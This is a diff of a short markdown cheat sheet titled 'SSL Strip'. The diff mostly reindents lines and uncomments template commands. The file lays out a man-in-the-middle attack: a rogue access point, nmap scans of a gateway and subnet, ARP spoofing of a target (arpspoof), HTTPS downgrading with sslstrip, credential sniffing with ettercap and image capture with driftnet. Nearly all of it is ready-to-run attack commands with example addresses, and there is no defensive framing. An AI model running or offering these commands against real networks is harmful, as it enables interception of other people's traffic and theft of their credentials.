@@ -1,11 +1,11 @@
 # SSL Strip
 
 # add a fix me script, using assets
-./airbase-start.sh
-./rogue-mitm.sh
-sslstrip -f -p -k 10000
-ettercap -p -u -T -q -i at0
-driftnet -i eth0
+	./airbase-start.sh
+	./rogue-mitm.sh
+	sslstrip -f -p -k 10000
+	ettercap -p -u -T -q -i at0
+	driftnet -i eth0
 
 ## Manual Setup
 
@@ -37,16 +37,16 @@ range 10.0.0.20 10.0.0.50;
 
 	netdiscover
 
-#nmap -sS -O {gateway}
+nmap -sS -O {gateway}
 	nmap -sS -O 192.168.1.1/24
 
-#arpspoof -i {interface} -t {target} -r {gateway}
+arpspoof -i {interface} -t {target} -r {gateway}
 	arpspoof -i eth0 -t 192.168.1.25 -r 192.168.1.1
 
-#sslstrip -f -p -k {port}
+sslstrip -f -p -k {port}
 	sslstrip -f -p -k 10000
 
-#ettercap -p -u -T -q -i {interface}
+ettercap -p -u -T -q -i {interface}
 	ettercap -p -u -T -q -i at0
 
 ---
